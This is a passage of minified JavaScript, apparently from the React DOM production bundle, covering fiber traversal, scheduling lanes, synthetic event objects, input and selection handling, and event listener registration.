Error(x(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(x(60));if(typeof n.dangerouslySetInnerHTML!="object"||!("__html"in n.dangerouslySetInnerHTML))throw Error(x(61))}if(n.style!=null&&typeof n.style!="object")throw Error(x(62))}}function yl(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var wl=null;function ho(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var kl=null,et=null,nt=null;function fs(e){if(e=sr(e)){if(typeof kl!="function")throw Error(x(280));var n=e.stateNode;n&&(n=yi(n),kl(e.stateNode,e.type,n))}}function Ka(e){et?nt?nt.push(e):nt=[e]:et=e}function Ya(){if(et){var e=et,n=nt;if(nt=et=null,fs(e),n)for(e=0;e<n.length;e++)fs(n[e])}}function Xa(e,n){return e(n)}function qa(){}var zi=!1;function Ja(e,n,t){if(zi)return e(n,t);zi=!0;try{return Xa(e,n,t)}finally{zi=!1,(et!==null||nt!==null)&&(qa(),Ya())}}function Ut(e,n){var t=e.stateNode;if(t===null)return null;var r=yi(t);if(r===null)return null;t=r[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(e=e.type,r=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!r;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(x(231,n,typeof t));return t}var xl=!1;if(Qe)try{var wt={};Object.defineProperty(wt,"passive",{get:function(){xl=!0}}),window.addEventListener("test",wt,wt),window.removeEventListener("test",wt,wt)}catch{xl=!1}function Nd(e,n,t,r,i,l,o,s,a){var c=Array.prototype.slice.call(arguments,3);try{n.apply(t,c)}catch(g){this.onError(g)}}var Ot=!1,Vr=null,Wr=!1,Sl=null,Ld={onError:function(e){Ot=!0,Vr=e}};function Od(e,n,t,r,i,l,o,s,a){Ot=!1,Vr=null,Nd.apply(Ld,arguments)}function jd(e,n,t,r,i,l,o,s,a){if(Od.apply(this,arguments),Ot){if(Ot){var c=Vr;Ot=!1,Vr=null}else throw Error(x(198));Wr||(Wr=!0,Sl=c)}}function zn(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function Za(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function ps(e){if(zn(e)!==e)throw Error(x(188))}function Rd(e){var n=e.alternate;if(!n){if(n=zn(e),n===null)throw Error(x(188));return n!==e?null:e}for(var t=e,r=n;;){var i=t.return;if(i===null)break;var l=i.alternate;if(l===null){if(r=i.return,r!==null){t=r;continue}break}if(i.child===l.child){for(l=i.child;l;){if(l===t)return ps(i),e;if(l===r)return ps(i),n;l=l.sibling}throw Error(x(188))}if(t.return!==r.return)t=i,r=l;else{for(var o=!1,s=i.child;s;){if(s===t){o=!0,t=i,r=l;break}if(s===r){o=!0,r=i,t=l;break}s=s.sibling}if(!o){for(s=l.child;s;){if(s===t){o=!0,t=l,r=i;break}if(s===r){o=!0,r=l,t=i;break}s=s.sibling}if(!o)throw Error(x(189))}}if(t.alternate!==r)throw Error(x(190))}if(t.tag!==3)throw Error(x(188));return t.stateNode.current===t?e:n}function eu(e){return e=Rd(e),e!==null?nu(e):null}function nu(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=nu(e);if(n!==null)return n;e=e.sibling}return null}var tu=we.unstable_scheduleCallback,hs=we.unstable_cancelCallback,Ad=we.unstable_shouldYield,Md=we.unstable_requestPaint,G=we.unstable_now,Id=we.unstable_getCurrentPriorityLevel,mo=we.unstable_ImmediatePriority,ru=we.unstable_UserBlockingPriority,$r=we.unstable_NormalPriority,Dd=we.unstable_LowPriority,iu=we.unstable_IdlePriority,hi=null,Be=null;function zd(e){if(Be&&typeof Be.onCommitFiberRoot=="function")try{Be.onCommitFiberRoot(hi,e,void 0,(e.current.flags&128)===128)}catch{}}var Re=Math.clz32?Math.clz32:Ud,Bd=Math.log,Fd=Math.LN2;function Ud(e){return e>>>=0,e===0?32:31-(Bd(e)/Fd|0)|0}var vr=64,yr=4194304;function _t(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Gr(e,n){var t=e.pendingLanes;if(t===0)return 0;var r=0,i=e.suspendedLanes,l=e.pingedLanes,o=t&268435455;if(o!==0){var s=o&~i;s!==0?r=_t(s):(l&=o,l!==0&&(r=_t(l)))}else o=t&~i,o!==0?r=_t(o):l!==0&&(r=_t(l));if(r===0)return 0;if(n!==0&&n!==r&&!(n&i)&&(i=r&-r,l=n&-n,i>=l||i===16&&(l&4194240)!==0))return n;if(r&4&&(r|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=r;0<n;)t=31-Re(n),i=1<<t,r|=e[t],n&=~i;return r}function Hd(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Vd(e,n){for(var t=e.suspendedLanes,r=e.pingedLanes,i=e.expirationTimes,l=e.pendingLanes;0<l;){var o=31-Re(l),s=1<<o,a=i[o];a===-1?(!(s&t)||s&r)&&(i[o]=Hd(s,n)):a<=n&&(e.expiredLanes|=s),l&=~s}}function bl(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function lu(){var e=vr;return vr<<=1,!(vr&4194240)&&(vr=64),e}function Bi(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function lr(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-Re(n),e[n]=t}function Wd(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var r=e.eventTimes;for(e=e.expirationTimes;0<t;){var i=31-Re(t),l=1<<i;n[i]=0,r[i]=-1,e[i]=-1,t&=~l}}function go(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var r=31-Re(t),i=1<<r;i&n|e[r]&n&&(e[r]|=n),t&=~i}}var M=0;function ou(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var su,vo,au,uu,cu,El=!1,wr=[],sn=null,an=null,un=null,Ht=new Map,Vt=new Map,nn=[],$d="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function ms(e,n){switch(e){case"focusin":case"focusout":sn=null;break;case"dragenter":case"dragleave":an=null;break;case"mouseover":case"mouseout":un=null;break;case"pointerover":case"pointerout":Ht.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":Vt.delete(n.pointerId)}}function kt(e,n,t,r,i,l){return e===null||e.nativeEvent!==l?(e={blockedOn:n,domEventName:t,eventSystemFlags:r,nativeEvent:l,targetContainers:[i]},n!==null&&(n=sr(n),n!==null&&vo(n)),e):(e.eventSystemFlags|=r,n=e.targetContainers,i!==null&&n.indexOf(i)===-1&&n.push(i),e)}function Gd(e,n,t,r,i){switch(n){case"focusin":return sn=kt(sn,e,n,t,r,i),!0;case"dragenter":return an=kt(an,e,n,t,r,i),!0;case"mouseover":return un=kt(un,e,n,t,r,i),!0;case"pointerover":var l=i.pointerId;return Ht.set(l,kt(Ht.get(l)||null,e,n,t,r,i)),!0;case"gotpointercapture":return l=i.pointerId,Vt.set(l,kt(Vt.get(l)||null,e,n,t,r,i)),!0}return!1}function du(e){var n=Pn(e.target);if(n!==null){var t=zn(n);if(t!==null){if(n=t.tag,n===13){if(n=Za(t),n!==null){e.blockedOn=n,cu(e.priority,function(){au(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function jr(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=Cl(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var r=new t.constructor(t.type,t);wl=r,t.target.dispatchEvent(r),wl=null}else return n=sr(t),n!==null&&vo(n),e.blockedOn=t,!1;n.shift()}return!0}function gs(e,n,t){jr(e)&&t.delete(n)}function Qd(){El=!1,sn!==null&&jr(sn)&&(sn=null),an!==null&&jr(an)&&(an=null),un!==null&&jr(un)&&(un=null),Ht.forEach(gs),Vt.forEach(gs)}function xt(e,n){e.blockedOn===n&&(e.blockedOn=null,El||(El=!0,we.unstable_scheduleCallback(we.unstable_NormalPriority,Qd)))}function Wt(e){function n(i){return xt(i,e)}if(0<wr.length){xt(wr[0],e);for(var t=1;t<wr.length;t++){var r=wr[t];r.blockedOn===e&&(r.blockedOn=null)}}for(sn!==null&&xt(sn,e),an!==null&&xt(an,e),un!==null&&xt(un,e),Ht.forEach(n),Vt.forEach(n),t=0;t<nn.length;t++)r=nn[t],r.blockedOn===e&&(r.blockedOn=null);for(;0<nn.length&&(t=nn[0],t.blockedOn===null);)du(t),t.blockedOn===null&&nn.shift()}var tt=qe.ReactCurrentBatchConfig,Qr=!0;function Kd(e,n,t,r){var i=M,l=tt.transition;tt.transition=null;try{M=1,yo(e,n,t,r)}finally{M=i,tt.transition=l}}function Yd(e,n,t,r){var i=M,l=tt.transition;tt.transition=null;try{M=4,yo(e,n,t,r)}finally{M=i,tt.transition=l}}function yo(e,n,t,r){if(Qr){var i=Cl(e,n,t,r);if(i===null)Yi(e,n,r,Kr,t),ms(e,r);else if(Gd(i,e,n,t,r))r.stopPropagation();else if(ms(e,r),n&4&&-1<$d.indexOf(e)){for(;i!==null;){var l=sr(i);if(l!==null&&su(l),l=Cl(e,n,t,r),l===null&&Yi(e,n,r,Kr,t),l===i)break;i=l}i!==null&&r.stopPropagation()}else Yi(e,n,r,null,t)}}var Kr=null;function Cl(e,n,t,r){if(Kr=null,e=ho(r),e=Pn(e),e!==null)if(n=zn(e),n===null)e=null;else if(t=n.tag,t===13){if(e=Za(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return Kr=e,null}function fu(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Id()){case mo:return 1;case ru:return 4;case $r:case Dd:return 16;case iu:return 536870912;default:return 16}default:return 16}}var rn=null,wo=null,Rr=null;function pu(){if(Rr)return Rr;var e,n=wo,t=n.length,r,i="value"in rn?rn.value:rn.textContent,l=i.length;for(e=0;e<t&&n[e]===i[e];e++);var o=t-e;for(r=1;r<=o&&n[t-r]===i[l-r];r++);return Rr=i.slice(e,1<r?1-r:void 0)}function Ar(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function kr(){return!0}function vs(){return!1}function xe(e){function n(t,r,i,l,o){this._reactName=t,this._targetInst=i,this.type=r,this.nativeEvent=l,this.target=o,this.currentTarget=null;for(var s in e)e.hasOwnProperty(s)&&(t=e[s],this[s]=t?t(l):l[s]);return this.isDefaultPrevented=(l.defaultPrevented!=null?l.defaultPrevented:l.returnValue===!1)?kr:vs,this.isPropagationStopped=vs,this}return H(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=kr)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=kr)},persist:function(){},isPersistent:kr}),n}var pt={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ko=xe(pt),or=H({},pt,{view:0,detail:0}),Xd=xe(or),Fi,Ui,St,mi=H({},or,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:xo,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==St&&(St&&e.type==="mousemove"?(Fi=e.screenX-St.screenX,Ui=e.screenY-St.screenY):Ui=Fi=0,St=e),Fi)},movementY:function(e){return"movementY"in e?e.movementY:Ui}}),ys=xe(mi),qd=H({},mi,{dataTransfer:0}),Jd=xe(qd),Zd=H({},or,{relatedTarget:0}),Hi=xe(Zd),ef=H({},pt,{animationName:0,elapsedTime:0,pseudoElement:0}),nf=xe(ef),tf=H({},pt,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),rf=xe(tf),lf=H({},pt,{data:0}),ws=xe(lf),of={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},sf={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},af={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function uf(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=af[e])?!!n[e]:!1}function xo(){return uf}var cf=H({},or,{key:function(e){if(e.key){var n=of[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=Ar(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?sf[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:xo,charCode:function(e){return e.type==="keypress"?Ar(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Ar(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),df=xe(cf),ff=H({},mi,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),ks=xe(ff),pf=H({},or,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:xo}),hf=xe(pf),mf=H({},pt,{propertyName:0,elapsedTime:0,pseudoElement:0}),gf=xe(mf),vf=H({},mi,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),yf=xe(vf),wf=[9,13,27,32],So=Qe&&"CompositionEvent"in window,jt=null;Qe&&"documentMode"in document&&(jt=document.documentMode);var kf=Qe&&"TextEvent"in window&&!jt,hu=Qe&&(!So||jt&&8<jt&&11>=jt),xs=" ",Ss=!1;function mu(e,n){switch(e){case"keyup":return wf.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function gu(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var Vn=!1;function xf(e,n){switch(e){case"compositionend":return gu(n);case"keypress":return n.which!==32?null:(Ss=!0,xs);case"textInput":return e=n.data,e===xs&&Ss?null:e;default:return null}}function Sf(e,n){if(Vn)return e==="compositionend"||!So&&mu(e,n)?(e=pu(),Rr=wo=rn=null,Vn=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return hu&&n.locale!=="ko"?null:n.data;default:return null}}var bf={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function bs(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!bf[e.type]:n==="textarea"}function vu(e,n,t,r){Ka(r),n=Yr(n,"onChange"),0<n.length&&(t=new ko("onChange","change",null,t,r),e.push({event:t,listeners:n}))}var Rt=null,$t=null;function Ef(e){_u(e,0)}function gi(e){var n=Gn(e);if(Ua(n))return e}function Cf(e,n){if(e==="change")return n}var yu=!1;if(Qe){var Vi;if(Qe){var Wi="oninput"in document;if(!Wi){var Es=document.createElement("div");Es.setAttribute("oninput","return;"),Wi=typeof Es.oninput=="function"}Vi=Wi}else Vi=!1;yu=Vi&&(!document.documentMode||9<document.documentMode)}function Cs(){Rt&&(Rt.detachEvent("onpropertychange",wu),$t=Rt=null)}function wu(e){if(e.propertyName==="value"&&gi($t)){var n=[];vu(n,$t,e,ho(e)),Ja(Ef,n)}}function Tf(e,n,t){e==="focusin"?(Cs(),Rt=n,$t=t,Rt.attachEvent("onpropertychange",wu)):e==="focusout"&&Cs()}function Pf(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return gi($t)}function _f(e,n){if(e==="click")return gi(n)}function Nf(e,n){if(e==="input"||e==="change")return gi(n)}function Lf(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Me=typeof Object.is=="function"?Object.is:Lf;function Gt(e,n){if(Me(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),r=Object.keys(n);if(t.length!==r.length)return!1;for(r=0;r<t.length;r++){var i=t[r];if(!sl.call(n,i)||!Me(e[i],n[i]))return!1}return!0}function Ts(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Ps(e,n){var t=Ts(e);e=0;for(var r;t;){if(t.nodeType===3){if(r=e+t.textContent.length,e<=n&&r>=n)return{node:t,offset:n-e};e=r}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=Ts(t)}}function ku(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?ku(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function xu(){for(var e=window,n=Hr();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=Hr(e.document)}return n}function bo(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function Of(e){var n=xu(),t=e.focusedElem,r=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&ku(t.ownerDocument.documentElement,t)){if(r!==null&&bo(t)){if(n=r.start,e=r.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var i=t.textContent.length,l=Math.min(r.start,i);r=r.end===void 0?l:Math.min(r.end,i),!e.extend&&l>r&&(i=r,r=l,l=i),i=Ps(t,l);var o=Ps(t,r);i&&o&&(e.rangeCount!==1||e.anchorNode!==i.node||e.anchorOffset!==i.offset||e.focusNode!==o.node||e.focusOffset!==o.offset)&&(n=n.createRange(),n.setStart(i.node,i.offset),e.removeAllRanges(),l>r?(e.addRange(n),e.extend(o.node,o.offset)):(n.setEnd(o.node,o.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var jf=Qe&&"documentMode"in document&&11>=document.documentMode,Wn=null,Tl=null,At=null,Pl=!1;function _s(e,n,t){var r=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;Pl||Wn==null||Wn!==Hr(r)||(r=Wn,"selectionStart"in r&&bo(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),At&&Gt(At,r)||(At=r,r=Yr(Tl,"onSelect"),0<r.length&&(n=new ko("onSelect","select",null,n,t),e.push({event:n,listeners:r}),n.target=Wn)))}function xr(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var $n={animationend:xr("Animation","AnimationEnd"),animationiteration:xr("Animation","AnimationIteration"),animationstart:xr("Animation","AnimationStart"),transitionend:xr("Transition","TransitionEnd")},$i={},Su={};Qe&&(Su=document.createElement("div").style,"AnimationEvent"in window||(delete $n.animationend.animation,delete $n.animationiteration.animation,delete $n.animationstart.animation),"TransitionEvent"in window||delete $n.transitionend.transition);function vi(e){if($i[e])return $i[e];if(!$n[e])return e;var n=$n[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in Su)return $i[e]=n[t];return e}var bu=vi("animationend"),Eu=vi("animationiteration"),Cu=vi("animationstart"),Tu=vi("transitionend"),Pu=new Map,Ns="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function yn(e,n){Pu.set(e,n),Dn(n,[e])}for(var Gi=0;Gi<Ns.length;Gi++){var Qi=Ns[Gi],Rf=Qi.toLowerCase(),Af=Qi[0].toUpperCase()+Qi.slice(1);yn(Rf,"on"+Af)}yn(bu,"onAnimationEnd");yn(Eu,"onAnimationIteration");yn(Cu,"onAnimationStart");yn("dblclick","onDoubleClick");yn("focusin","onFocus");yn("focusout","onBlur");yn(Tu,"onTransitionEnd");lt("onMouseEnter",["mouseout","mouseover"]);lt("onMouseLeave",["mouseout","mouseover"]);lt("onPointerEnter",["pointerout","pointerover"]);lt("onPointerLeave",["pointerout","pointerover"]);Dn("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Dn("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Dn("onBeforeInput",["compositionend","keypress","textInput","paste"]);Dn("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Dn("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Dn("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Nt="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Mf=new Set("cancel close invalid load scroll toggle".split(" ").concat(Nt));function Ls(e,n,t){var r=e.type||"unknown-event";e.currentTarget=t,jd(r,n,void 0,e),e.currentTarget=null}function _u(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var r=e[t],i=r.event;r=r.listeners;e:{var l=void 0;if(n)for(var o=r.length-1;0<=o;o--){var s=r[o],a=s.instance,c=s.currentTarget;if(s=s.listener,a!==l&&i.isPropagationStopped())break e;Ls(i,s,c),l=a}else for(o=0;o<r.length;o++){if(s=r[o],a=s.instance,c=s.currentTarget,s=s.listener,a!==l&&i.isPropagationStopped())break e;Ls(i,s,c),l=a}}}if(Wr)throw e=Sl,Wr=!1,Sl=null,e}function D(e,n){var t=n[jl];t===void 0&&(t=n[jl]=new Set);var r=e+"__bubble";t.has(r)||(Nu(n,e,2,!1),t.add(r))}function Ki(e,n,t){var r=0;n&&(r|=4),Nu(t,e,r,n)}var Sr="_reactListening"+Math.random().toString(36).slice(2);function Qt(e){if(!e[Sr]){e[Sr]=!0,Ia.forEach(function(t){t!=="selectionchange"&&(Mf.has(t)||Ki(t,!1,e),Ki(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[Sr]||(n[Sr]=!0,Ki("selectionchange",!1,n))}}function Nu(e,n,t,r){switch(fu(n)){case 1:var i=Kd;break;case 4:i=Yd;break;default:i=yo}t=i.bind(null,n,t,e),i=void 0,!xl||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(i=!0),r?i!==void 0?e.addEventListener(n,t,{capture:!0,passive:i}):e.addEventListener(n,t,!0):i!==void 0?e.addEventListener(n,t,{passive:i}):e.addEventListener(n,t,!1)}function Yi(e,n,t,r,i){var l=r;if(!(n&1)&&!(n&2)&&r!==null)e:for(;;){if(r===null)return;var o=r.tag;if(o===3||o===4){var s=r.stateNode.containerInfo;if(s===i||s.nodeType===8&&s.parentNode===i)break;if(o===4)for(o=r.return;o!==null;){var a=o.tag;if((a===3||a===4)&&(a=o.stateNode.containerInfo,a===i||a.nodeType===8&&a.parentNode===i))return;o=o.return}for(;s!==null;){if(o=Pn(s),o===null)return;if(a=o.tag,a===5||a===6){r=l=o;continue e}s=s.parentNode}}r=r.return}Ja(function(){var c=l,g=ho(t),h=[];e:{var m=Pu.get(e);if(m!==void 0){var v=ko,w=e;switch(e){case"keypress":if(Ar(t)===0)break e;case"keydown":case"keyup":v=df;break;case"focusin":w="focus",v=Hi;break;case"focusout":w="blur",v=Hi;break;case"beforeblur":case"afterblur":v=Hi;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=ys;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=Jd;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=hf;break;case bu:case Eu:case Cu:v=nf;break;case Tu:v=gf;break;case"scroll":v=Xd;break;case"wheel":v=yf;break;case"copy":case"cut":case"paste":v=rf;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=ks}var k=(n&4)!==0,E=!k&&e==="scroll",f=k?m!==null?m+"Capture":null:m;k=[];for(var d=c,p;d!==null;){p=d;var y=p.stateNode;if(p.tag===5&&y!==null&&(p=y,f!==null&&(y=Ut(d,f),y!=null&&k.push(Kt(d,y,p)))),E)break;d=d.return}0<k.length&&(m=new v(m,w,null,t,g),h.push({event:m,listeners:k}))}}if(!(n&7)){e:{if(m=e==="mouseover"||e==="pointerover",v=e==="mouseout"||e==="pointerout",m&&t!==wl&&(w=t.relatedTarget||t.fromElement)&&(Pn(w)||w[Ke]))break 